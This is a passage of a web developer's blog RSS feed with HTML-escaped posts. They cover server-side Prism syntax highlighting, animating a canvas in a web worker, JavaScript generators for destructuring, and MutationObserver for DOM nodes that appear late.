    &amp;lt;span class=&quot;token keyword&quot;&amp;gt;const&amp;lt;/span&amp;gt; greeting &amp;lt;span class=&quot;token operator&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;token string&quot;&amp;gt;&apos;Hello, world!&apos;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;token punctuation&quot;&amp;gt;;&amp;lt;/span&amp;gt;

    &amp;lt;span class=&quot;token keyword&quot;&amp;gt;function&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;token function&quot;&amp;gt;sayGreeting&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;token punctuation&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;token punctuation&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;token punctuation&quot;&amp;gt;{&amp;lt;/span&amp;gt;
      &amp;lt;span class=&quot;token console class-name&quot;&amp;gt;console&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;token punctuation&quot;&amp;gt;.&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;token method function property-access&quot;&amp;gt;log&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;token punctuation&quot;&amp;gt;(&amp;lt;/span&amp;gt;greeting&amp;lt;span class=&quot;token punctuation&quot;&amp;gt;)&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;token punctuation&quot;&amp;gt;;&amp;lt;/span&amp;gt;
    &amp;lt;span class=&quot;token punctuation&quot;&amp;gt;}&amp;lt;/span&amp;gt;
  &amp;lt;/code&amp;gt;
&amp;lt;/pre&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But it takes work to download, parse, execute that code, and then allow the browser to paint it to the screen. If your readers are running on a slow connection, it can lead to some ugly layout shift.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/snippet-gif-1.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;534&quot; height=&quot;250&quot; /&gt;&lt;/figure&gt;&lt;p&gt;And that problem only compounds when your content has several snippets rendering at once.&lt;/p&gt;&lt;h2&gt;Run It on the Server Instead &lt;/h2&gt;&lt;p&gt;Prism&apos;s support for &lt;a href=&quot;https://prismjs.com/?ref=cms.macarthur.me#basic-usage-node&quot;&gt;processing markup in Node&lt;/a&gt; is right on the front page of it&apos;s documentation. It&apos;s straightforward to set up, and simple to load any language you need to support. Here&apos;s how you&apos;d parse a single PHP snippet, for example. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const Prism = require(&quot;prismjs&quot;);
const loadLanguages = require(&quot;prismjs/components/index&quot;);

// Load all languages.
loadLanguages();

const snippet = `
&amp;lt;pre&amp;gt;&amp;lt;code class=&quot;language-php&quot;&amp;gt;
  $greeting = &apos;Hello, world!&apos;;
  echo $greeting;
&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;
`;

const html = Prism.highlight(snippet, Prism.languages.php, &apos;php&apos;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But you&apos;re probably receiving the entirety of a page&apos;s content at once, and in order to process snippets embedded within a bunch of other text, you need to get a little more creative. &lt;/p&gt;&lt;h3&gt;Processing Code Snippets within Text Content&lt;/h3&gt;&lt;p&gt;Depending on your preferences, you&apos;ve got a couple of options. &lt;/p&gt;&lt;h4&gt;Option #1: RegEx &amp;amp; a Replacement Function&lt;/h4&gt;&lt;p&gt;If you&apos;re committed to keeping your dependencies as minimal as possible, you could run all of your content through a &lt;code&gt;.replace()&lt;/code&gt; callback, relying a regular expression to extract &amp;amp; process snippets. I spent way too much time tinkering with this, and this pattern appears to work reliably. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const Prism = require(&quot;prismjs&quot;);
const loadLanguages = require(&quot;prismjs/components/index&quot;);

// Load all languages.
loadLanguages();

const processedContent = content.replace(
  /(&amp;lt;pre&amp;gt;\n\s*&amp;lt;code class=&quot;language-(.*)&quot;&amp;gt;)([\s\S]*?)(&amp;lt;\/code&amp;gt;\n\s*&amp;lt;\/pre&amp;gt;)/g,
  (_wrapper, openingTags, language, codeSnippet, closingTags) =&amp;gt; {
    const snippet = Prism.highlight(
      codeSnippet,
      Prism.languages[language],
      language
    );

    return `${openingTags}${snippet}${closingTags}`;
  }
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using that pattern, each snippet is parsed based on the language noted in the the class – represented by &lt;code&gt;language-(.*)&lt;/code&gt;. &lt;/p&gt;&lt;p&gt;But many of us have scars from working with regular expressions that &lt;em&gt;appear&lt;/em&gt; to work reliably, and then unexpectedly bite us. So, there&apos;s a more predictable approach you could leverage as well, so long as you&apos;re running an a Node environment that supports it. &lt;/p&gt;&lt;h4&gt;Option #2: JSDOM&lt;/h4&gt;&lt;p&gt;If a RegEx feels too risky, JSDOM is also an option, allowing you to manipulate snippets as though they were in the browser DOM.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const JSDOM = require(&quot;jsdom&quot;).JSDOM;

const content = getContentFromWherever();

// Pop markup into a JSDOM instance.
const dom = new JSDOM(content);

// Query for every code snippet.
const codeBlocks = dom.window.document.querySelectorAll(&quot;pre code&quot;);

// Parse each snippet with Prism.
codeBlocks.forEach((block) =&amp;gt; {
    
  // Identify the language of the code block.
  const language = block.classList[0].replace(&quot;language-&quot;, &quot;&quot;);
  
  // Add language class to parent &amp;lt;pre&amp;gt; tag.
  block.parentElement.classList.add(`language-${language}`);
   
  // Extract the code to be processed.
  const code = block.textContent;
    
  // Process the code according to the specific language.
  const html = Prism.highlight(
    code,
    Prism.languages[language],
    language
  );

  // Replaced the DOM with the processed snippet.   
  block.innerHTML = html;
});

// Spit out the result.
const processedContent = dom.window.document.body.innerHTML;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No matter which of theese you choose, you&apos;ll get those key benefits: the ability to leverage all the languages you like with no performance cost to the user, and no flash of unstyled snippets. All that&apos;s left for the browser is a small amount of CSS for styling:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/image-3.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;616&quot; height=&quot;206&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/03/image-3.png 600w, https://cms.macarthur.me/content/images/2023/03/image-3.png 616w&quot; /&gt;&lt;/figure&gt;&lt;h2&gt;You Make the Call&lt;/h2&gt;&lt;p&gt;It&apos;s not always going to be prudent to set up Prism server-side. Maybe your server or site&apos;s build process doesn&apos;t rely on Node (for example, if your site runs WordPress or Hugo). Or, maybe your back end is just too opaque and/or complicated to warrant investing in such a change. That&apos;s fine. &lt;/p&gt;&lt;p&gt;But definitely consider it if you&apos;re able. It&apos;s a small thing you can do to keep your site&apos;s user experience as optimal as possible.&lt;/p&gt;</content:encoded></item><item><title>Consider Animating Your Canvas in a Web Worker</title><link>https://macarthur.me/posts/animate-canvas-in-a-worker</link><guid isPermaLink="true">https://macarthur.me/posts/animate-canvas-in-a-worker</guid><pubDate>Sat, 11 Mar 2023 16:38:21 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;ve been working on a project that renders a &lt;em&gt;lot &lt;/em&gt;canvas elements, each with an image and some shapes painted on it. They&apos;re painted lazily using the IntersectionObserver API, but even so, at a certain point, the browser&apos;s main thread has really starts to feel it. As those canvases render, other interactions slows down. The jank becomes real. &lt;/p&gt;&lt;p&gt;When I encountered this, I started thinking back to when I &lt;a href=&quot;https://www.macarthur.me/posts/use-web-workers-for-your-event-listeners?ref=cms.macarthur.me&quot;&gt;first dabbled with web workers&lt;/a&gt; and recognized the positive impact they can have on a browser&apos;s snappiness. So, naturally, I started to explore whether they&apos;d come in handy for drawing on a canvas. &lt;/p&gt;&lt;p&gt;I wasn&apos;t that optimistic. A canvas is a very visual element – inherently related to what the user sees and how the browser paints to the screen. But as it turns out, &lt;strong&gt;you can easily paint a canvas inside a web worker – even animate it. &lt;/strong&gt;And it can make a huge difference to a user&apos;s experience on your site. &lt;/p&gt;&lt;h2&gt;A Contrived Playground&lt;/h2&gt;&lt;p&gt;To explore this, we&apos;re starting with a simple setup – a canvas drawn with a heart, which is set to infinitely rotate, as orchestrated by &lt;code&gt;requestAnimationFrame()&lt;/code&gt;. I&apos;m leaving the boring details out, but here&apos;s generally how it works:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;canvas id=&quot;canvas&quot; height=&quot;250&quot; width=&quot;250&quot;&amp;gt;&amp;lt;/canvas&amp;gt;

&amp;lt;script&amp;gt;
    const ctx = canvas.getContext(&apos;2d&apos;);

    function drawHeart() {
		// Draw a heart. 
    }

    function drawAndRotate() {
		// Clear, rotate a smidge.
        
		drawHeart();

		// Right before the next paint, trigger another redraw &amp;amp; rotation.
		requestAnimationFrame(drawAndRotate);
    }

    drawAndRotate();  
&amp;lt;/script&amp;gt;	&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The result looks something like this (on a real page, it&apos;d be an infinite rotation). &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/03/rotating-heart-1.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;260&quot; height=&quot;248&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;The Consequences of a Stuffy Thread&lt;/h3&gt;&lt;p&gt;This would normally run pretty smoothly – until we start messing with the main thread. Let&apos;s do that artificially with a long-running &lt;code&gt;while&lt;/code&gt; loop: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;button id=&quot;button&quot;&amp;gt;Block for Three Seconds&amp;lt;/button&amp;gt;
&amp;lt;canvas id=&quot;canvas&quot; height=&quot;250&quot; width=&quot;250&quot;&amp;gt;&amp;lt;/canvas&amp;gt;

&amp;lt;script&amp;gt;
    document.getElementById(&apos;button&apos;).addEventListener(&apos;click&apos;, () =&amp;gt; {
        const start = Date.now();
        
        // Thread is blocked! No UI updates allowed.
        while (Date.now() - start &amp;lt; 3000) {}
    });  

    // ...our canvas-painting code from before.
&amp;lt;/script&amp;gt;	&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;While this button is pushed, everything running on the main thread is blocked for three seconds – including UI updates, event listeners, and anything else running on it. An animated canvas is no exception. &lt;/p&gt;&lt;p&gt;See for yourself what happens to the animation when the main thread is blocked. Complete freeze.&lt;/p&gt;&lt;p&gt;
  &lt;span&gt;See the Pen &lt;a href=&quot;https://codepen.io/alexmacarthur/pen/PodErOg?ref=cms.macarthur.me&quot;&gt;
  Animated Canvas - Main Thread&lt;/a&gt; by Alex MacArthur (&lt;a href=&quot;https://codepen.io/alexmacarthur?ref=cms.macarthur.me&quot;&gt;@alexmacarthur&lt;/a&gt;)
  on &lt;a href=&quot;https://codepen.io/?ref=cms.macarthur.me&quot;&gt;CodePen&lt;/a&gt;.&lt;/span&gt;
&lt;/p&gt;
&lt;p&gt;Of course, the impact of a clogged main thread will vary between applications, but there&apos;s usually a lot going on during a browser session, and all of that activity is competing with animations you&apos;d probably like to keep buttery smooth. It&apos;s &lt;em&gt;generally&lt;/em&gt; a good idea to offload as much of that work as reasonably as possible.&lt;/p&gt;&lt;h3&gt;Let a Web Worker Do the Heavy Lifting&lt;/h3&gt;&lt;p&gt;Within the last few years, browsers introduced the &lt;code&gt;OffscreenCanvas&lt;/code&gt; interface, which allows you render and manipulate a canvas in a separate thread, completely &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/OffscreenCanvas?ref=cms.macarthur.me#browser_compatibility&quot;&gt;detached from the DOM&lt;/a&gt;. This means &lt;em&gt;all&lt;/em&gt; of that expensive drawing – and even animation driven by &lt;code&gt;requestAnimationFrame()&lt;/code&gt; – can be done off the main thread, without impacting the front-end responsiveness of an application.&lt;/p&gt;&lt;p&gt;Let&apos;s tweak our setup a bit. Rather than handling the entire animation in a single script, we&apos;ll do the following: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;Create an off-screen instance from our canvas element for painting.&lt;/li&gt;&lt;li&gt;Transfer ownership of that instance to a web worker.&lt;/li&gt;&lt;li&gt;Render and animate the canvas &lt;strong&gt;remotely&lt;/strong&gt;, from within the worker.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Here&apos;s how our primary script will look:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;canvas id=&quot;canvas&quot; height=&quot;250&quot; width=&quot;250&quot;&amp;gt;&amp;lt;/canvas&amp;gt;

&amp;lt;script&amp;gt;
	const canvas = document.getElementById(&apos;canvas&apos;);
    // Create a canvas instance not dependent on the DOM.
	const offscreenCanvas = canvas.transferControlToOffscreen();
    
    // Register our worker script.
	const worker = new Worker(&apos;canvas-worker.js&apos;);

	// Give ownership of the canvas to the worker&apos;s context.
	worker.postMessage({canvas: offscreenCanvas}, [offscreenCanvas]);

	// ...other code blocking main thread for three seconds.
&amp;lt;/script&amp;gt;	&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And here&apos;s that new &lt;code&gt;canvas-worker.js&lt;/code&gt; file. The code is largely the same, but waiting to receive a reference to the offscreen canvas from the main thread.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// canvas-worker.js

self.onmessage = function (event) {
    const canvas = event.data.canvas;
	const ctx = canvas.getContext(&apos;2d&apos;);

    function drawHeart() {
		// Draw a heart. 
    }

    function drawAndRotate() {
		// Clear, rotate a smidge.
        
		drawHeart();

		// Right before the next paint, trigger another redraw &amp;amp; rotation.
		requestAnimationFrame(drawAndRotate);
    }

    drawAndRotate(); 
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this change, everything &lt;em&gt;looks&lt;/em&gt; like it did before. The heart is drawn and it infinitely rotates. But if you click the button to block the main thread this time around, &lt;strong&gt;the animation won&apos;t stop.&lt;/strong&gt; Every bit of its rendering and animation is controlled by a separate thread, safe and out of the way. &lt;/p&gt;&lt;p&gt;Try hitting that button again to block the thread. No more freezing.&lt;/p&gt;&lt;p&gt;
  &lt;span&gt;See the Pen &lt;a href=&quot;https://codepen.io/alexmacarthur/pen/MWqrMrj?ref=cms.macarthur.me&quot;&gt;
  Animated Canvas - Main Thread&lt;/a&gt; by Alex MacArthur (&lt;a href=&quot;https://codepen.io/alexmacarthur?ref=cms.macarthur.me&quot;&gt;@alexmacarthur&lt;/a&gt;)
  on &lt;a href=&quot;https://codepen.io/?ref=cms.macarthur.me&quot;&gt;CodePen&lt;/a&gt;.&lt;/span&gt;
&lt;/p&gt;
&lt;p&gt;The particularly interesting part of this for me is the fact that I can use &lt;code&gt;requestAnimationFrame()&lt;/code&gt; apart from the DOM with no issue. It&apos;s a little amazing that we can give that level of control for a UI-related entity to a completely separate thread and manipulate it remotely, with so little setup. &lt;/p&gt;&lt;h2&gt;Workerize Everything? &lt;/h2&gt;&lt;p&gt;Meh, probably not. Depending on the complexity of your canvas (maybe you&apos;re not even animating it), it just might not be worth the overhead of wiring up a worker to render it. Not to mention, there&apos;s a performance cost to coordinating that communication between threads anyway. In some cases, you might even shoot yourself in the foot by leaning into it all too hard. &lt;/p&gt;&lt;p&gt;Even so, I&apos;d like to see us begin to ask &quot;would this be better suited for a worker?&quot; more often than we do now. Chances are, we&apos;re leaving a lot of performance gains on the table by not doing so.&lt;/p&gt;</content:encoded></item><item><title>More Elegant Destructuring with JavaScript Generators</title><link>https://macarthur.me/posts/destructuring-with-generators</link><guid isPermaLink="true">https://macarthur.me/posts/destructuring-with-generators</guid><pubDate>Sat, 25 Feb 2023 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;JavaScript has a standard for defining an object’s iteration behavior. In fact, it’s at work whenever you destructure an array or use it in a &lt;code&gt;for..of&lt;/code&gt; loop.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const arr = [&apos;first&apos;, &apos;second&apos;, &apos;third&apos;];

// Using destructuring: 
const [first, second, third] = arr;

// Using a `for..of` loop: 
for(const item of arr) {
	doStuff(item);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But it’s not just for built-in objects. You can make &lt;em&gt;any&lt;/em&gt; object iterable by giving it a &lt;code&gt;Symbol.iterator&lt;/code&gt; function property that returns an object adhering to the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_Generators?ref=cms.macarthur.me#iterables&quot;&gt;iterator protocol&lt;/a&gt;. In its most basic form, that returned object has &lt;code&gt;next()&lt;/code&gt; method returning &lt;em&gt;another&lt;/em&gt; object with &lt;code&gt;value&lt;/code&gt; and &lt;code&gt;done&lt;/code&gt; properties.&lt;/p&gt;&lt;p&gt;For example, here’s an iterable that provides a range of numbers (&lt;code&gt;1&lt;/code&gt; through &lt;code&gt;3&lt;/code&gt;):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;let count = 1;

const iterableObj = {
  [Symbol.iterator]() {
    return {
      next() {
        return {
          done: count === 4,
          value: count++,
        };
      },
    };
  },
};

for (const item of iterableObj) {
  console.log(item);
}

// 1
// 2
// 3
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Correctly setting that &lt;code&gt;done&lt;/code&gt; property is critical, because that’s how the &lt;code&gt;for&lt;/code&gt; loop will know when to discontinue execution, or, if you’re destructuring, when you’ll start getting &lt;code&gt;undefined&lt;/code&gt; values:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const [a, b, c, d] = iterableObj;

// 1, 2, 3, undefined
&lt;/code&gt;&lt;/pre&gt;&lt;h2&gt;Interesting, but… practical?&lt;/h2&gt;&lt;p&gt;While all that’s cool, there’s a notorious lack of “real” use cases for custom iterables in the wild. At least, that’s the story as I’ve experienced it.&lt;/p&gt;&lt;p&gt;And then I saw this tweet from &lt;a href=&quot;https://twitter.com/alexandereardon/status/1534762394848636928?ref=cms.macarthur.me&quot;&gt;Alex Reardon&lt;/a&gt;. In his example, an iterator and destructuring are used to generate an arbitrary number of objects on the fly (DOM elements, in his case). Here’s that implementation (a smidge modified, but the same spirit):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function getElements(tagName = &apos;div&apos;) {
  return {
    [Symbol.iterator]() {
      return {
        next() {
          return {
            done: false,
            value: document.createElement(tagName),
          };
        },
      };
    },
  };
}

const [el1, el2, el3] = getElements(&apos;div&apos;);

console.log(el1, el2, el3); 
// HTMLDivElement, HTMLDivElement, HTMLDivElement
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At first, it looked unnecessarily complicated, especially when considering what I’d personally otherwise do with an array:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function getElements(tagName = &apos;div&apos;, number) {
  return new Array(number).fill(null).map(i =&amp;gt; document.createElement(tagName));
}

const [el1, el2, el3] = getElements(&apos;div&apos;, 3);

console.log(el1, el2, el3);
// HTMLDivElement, HTMLDivElement, HTMLDivElement
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Despite needing to specify how many items you’d like to generate up front, this sort of approach had always satisfied me (despite &lt;code&gt;.fill()&lt;/code&gt; always feeling a little weird). But then I remembered that there’s more than one way to make your own iterable in JavaScript.&lt;/p&gt;&lt;h2&gt;Generators: Write Simpler Iterables&lt;/h2&gt;&lt;p&gt;If using &lt;code&gt;Symbol.iterator&lt;/code&gt; is too verbose, you can syntactically sweeten it with a &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator?ref=cms.macarthur.me&quot;&gt;generator&lt;/a&gt;, a special function returning a &lt;code&gt;Generator&lt;/code&gt; object that functions the same way as a hand-written iterable. Here’s that same method written as a generator function:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function* getElements(tagName = &apos;div&apos;) {
  while (true) {
    yield document.createElement(tagName);
  }
}

const [el1, el2, el3] = getElements(&apos;div&apos;);

console.log(el1, el2, el3);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That infinite &lt;code&gt;while&lt;/code&gt; loop may be startling, but it’s safe — the &lt;code&gt;yield&lt;/code&gt; keyword won’t allow it to continue to run until the generator is invoked each time, whether it be via &lt;code&gt;for..of&lt;/code&gt; (which you can even use asynchronously), destructuring, or something else.&lt;/p&gt;&lt;h2&gt;Some Perks to Destructuring with a Generator&lt;/h2&gt;&lt;p&gt;This change made it much more appealing to use iterables in destructuring items, for a few reasons:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;strong&gt;I don’t need to specify how many items I want to generate up front.&lt;/strong&gt; As such, the function’s signature is a little simpler (the &lt;code&gt;number&lt;/code&gt; parameter is no longer required).&lt;/li&gt;&lt;li&gt;&lt;strong&gt;There’s a (small) performance advantage.&lt;/strong&gt; Items are produced on demand, not up front. I’ll never accidentally generate five items, end up only needing three, and leaving two orphans.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;In my opinion, it’s&lt;/strong&gt; &lt;em&gt;&lt;strong&gt;more&lt;/strong&gt;&lt;/em&gt; &lt;strong&gt;elegant than filling an array.&lt;/strong&gt; You can even get the function body down to a single line:&lt;/li&gt;&lt;/ol&gt;&lt;pre&gt;&lt;code&gt;function* getElements(tagName = &apos;div&apos;) {
  while (true) yield document.createElement(tagName);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And in addition to those benefits, an honorable mention: the increased social credibility that comes with telling people you’ve had a reason to use a generator.&lt;/p&gt;&lt;h2&gt;Time Will Yield More&lt;/h2&gt;&lt;p&gt;When you’ve used a certain set of tools for countless jobs, it’s not easy to be given a &lt;em&gt;new&lt;/em&gt; tool and expect to immediately know how it’s uniquely suited to solve certain problems. So, despite this being one of the first “practical” use cases I’ve for a generator, I don’t expect it to be the last. After all, it’s still a new tool for me.&lt;/p&gt;&lt;p&gt;That said, I’m eager to hear about other reasons iterators and generators are useful for a job, no matter how insignificant. If you have ‘em, &lt;code&gt;yield&lt;/code&gt; ’em!&lt;/p&gt;</content:encoded></item><item><title>Use a MutationObserver to Handle DOM Nodes that Don’t Exist Yet</title><link>https://macarthur.me/posts/use-mutation-observer-to-handle-nodes-that-dont-exist-yet</link><guid isPermaLink="true">https://macarthur.me/posts/use-mutation-observer-to-handle-nodes-that-dont-exist-yet</guid><pubDate>Mon, 13 Feb 2023 05:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Occasionally, you need to mess with a part of the DOM that doesn’t exist… yet.&lt;/p&gt;&lt;p&gt;There’s a variety of reasons the need could arise, but you might most often see it when dealing with third-party scripts that inject markup onto a page asynchronously. For example, I recently needed to update the UI whenever a user closed Google reCAPTCHA’s (v2) challenge. Responding to &lt;code&gt;blur&lt;/code&gt; events like this isn’t officially supported by the tool, so I intended to wire up a listener myself. However, trying to access the node via something like &lt;code&gt;.querySelector()&lt;/code&gt; yielded &lt;code&gt;null&lt;/code&gt; because it hadn’t yet been rendered by the browser on page load, and I couldn’t know exactly when it’d happen.&lt;/p&gt;&lt;p&gt;To explore this a little more with a more contrived example, I’ve wired up a button to be mounted to the DOM after a random amount of time (between zero and five seconds). If I were to try to add an event listener to that button from the get-go, I’d get an exception.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// Simulating lazily-rendered HTML:
setTimeout(() =&amp;gt; {
	const button = document.createElement(&apos;button&apos;);
	button.id = &apos;button&apos;;
	button.innerText = &apos;Do Something!&apos;;

 	document.body.append(button);
}, randomBetweenMs(1000, 5000));

document.querySelector(&apos;#button&apos;).addEventListener(&apos;click&apos;, () =&amp;gt; {
	alert(&apos;clicked!&apos;)
});

// Error: Cannot read properties of null (reading &apos;addEventListener&apos;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Not surprising. All the code you see is being thrown onto the call stack and executed immediately (except, of course, &lt;code&gt;setTimeout()&lt;/code&gt;’s callback), so by the time I try to access my button, all I find is &lt;code&gt;null&lt;/code&gt;.&lt;/p&gt;&lt;h2&gt;You Could Try Polling&lt;/h2&gt;&lt;p&gt;To get around this, it’s common to use polling, querying the DOM every so often until the node appears. You might’ve seen approaches like this using &lt;code&gt;setInterval&lt;/code&gt; or &lt;code&gt;setTimeout&lt;/code&gt;, like this example using recursion:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function attachListenerToButton() {
  let button = document.getElementById(&apos;button&apos;);

  if (button) {
    button.addEventListener(&apos;click&apos;, () =&amp;gt; alert(&apos;clicked!&apos;));
    return;
  }

	// If the node doesn&apos;t exist yet, try
	// again on the next turn of the event loop.
  setTimeout(attachListenerToButton);
}

attachListenerToButton();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or, you might’ve come across a Promise-based approach that &lt;em&gt;feels&lt;/em&gt; a little more modern:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;async function attachListenerToButton() {
  let button = document.getElementById(&apos;button&apos;);

  while (!button) {
		// If the node doesn&apos;t exist yet, try
		// again on the next turn of the event loop.
    button = document.getElementById(&apos;button&apos;);
    await new Promise((resolve) =&amp;gt; setTimeout(resolve));
  }

  button.addEventListener(&apos;click&apos;, () =&amp;gt; alert(&apos;clicked!&apos;));
}

attachListenerToButton();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Either way, there are non-trivial costs to this sort of tactic — the primary one being performance. In both versions, removing &lt;code&gt;setTimeout()&lt;/code&gt; would cause the script to run completely synchronously, blocking the main thread, along with any other task that needs to take place on it. No input events would be handled. Your tab would freeze. Chaos wouldn’t ensue.&lt;/p&gt;&lt;p&gt;Sticking a &lt;code&gt;setTimeout()&lt;/code&gt; (or &lt;code&gt;setInterval&lt;/code&gt;) in there kicks the next attempt onto the following iteration of the event loop, which allows other tasks to execute in the meantime. &lt;strong&gt;But you’re still repeatedly hogging the call stack waiting for your node to appear.&lt;/strong&gt; Far less than ideal if you want your code to steward the event loop well.&lt;/p&gt;&lt;p&gt;You &lt;em&gt;could&lt;/em&gt; lessen the call stack bloat by increasing the interval by which you query (like every 200ms). But you then risk something unexpected occurring between the time the node appears and when your work is performed. For example, if you’re doing something like adding a click event listener, you don’t want the user to have the chance to click the element &lt;em&gt;before&lt;/em&gt; you’ve attached a listener several milliseconds later. Issues like this are probably few and far between, but they’ll certainly cause distress when you’re later debugging what might’ve gone wrong.&lt;/p&gt;&lt;h2&gt;MutationObserver(): A Tool Built for the Job&lt;/h2&gt;&lt;p&gt;The &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver?ref=cms.macarthur.me&quot;&gt;MutationObserver API&lt;/a&gt; has been around for a bit now, and is &lt;a href=&quot;https://caniuse.com/mutationobserver?ref=cms.macarthur.me&quot;&gt;extremely well-supported in modern browsers&lt;/a&gt;. It has a straightforward purpose: do something when the DOM tree changes (including when a node gets inserted). But as a native browser API, you don’t have the same performance concerns as you would with polling. A basic set up for observing any changes within the &lt;code&gt;body&lt;/code&gt; looks like so:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const domObserver = new MutationObserver((mutationList) =&amp;gt; {
	// document.body has changed! Do something.
});

domObserver.observe(document.body, { childList: true, subtree: true });&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Taking it a little further for our contrived example is fairly straightforward. Every time the tree has changed, we’ll query for the specific node. If exists, attach the listener.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const domObserver = new MutationObserver(() =&amp;gt; {
  const button = document.getElementById(&apos;button&apos;);

  if (button) {
    button.addEventListener(&apos;click&apos;, () =&amp;gt; alert(&apos;clicked!&apos;));
  }
});

domObserver.observe(document.body, { childList: true, subtree: true });
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The options we’re passing to &lt;code&gt;.observe()&lt;/code&gt; are important. Setting &lt;code&gt;childList&lt;/code&gt; to &lt;code&gt;true&lt;/code&gt; makes the observer watch for changes to the node we’re targeting (&lt;code&gt;document.body&lt;/code&gt;), and &lt;code&gt;subtree: true&lt;/code&gt; will cause all descendants to also be monitored. Admittedly, the API here wasn’t tremendously easy (for me) to grok, and it’s &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver/observe?ref=cms.macarthur.me&quot;&gt;worth spending a bit of time thinking through&lt;/a&gt; before you use it for your own needs.&lt;/p&gt;&lt;p&gt;Regardless, this particular configuration is best for cases when you don’t know where the node might be injected. If you’re confident it’ll appear within a certain element, however, it’d be wise to target more narrowly.&lt;/p&gt;&lt;h2&gt;Important Step: Cleanup!&lt;/h2&gt;&lt;p&gt;If we left the observer as it is, we’d be at risk for adding another click event listener to the same button after &lt;em&gt;every&lt;/em&gt; proceeding change to the DOM. You could remedy this by pulling click event callback into its own variable outside the MutationObserver’s callback (&lt;code&gt;.addEventListener()&lt;/code&gt; won’t add a listener to a node with the same callback reference), but it’s far more intuitive to imperatively clean up the observer it’s once it’s no longer needed. There’s a nice method available on the observer to do that:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const domObserver = new MutationObserver((_mutationList, observer) =&amp;gt; {
	const button = document.getElementById(&apos;button&apos;);

	if (button) {
    	button.addEventListener(&apos;click&apos;, () =&amp;gt; console.log(&apos;clicked!&apos;));

		// No need to observe anymore. Clean up!
		observer.disconnect();
 	}
});
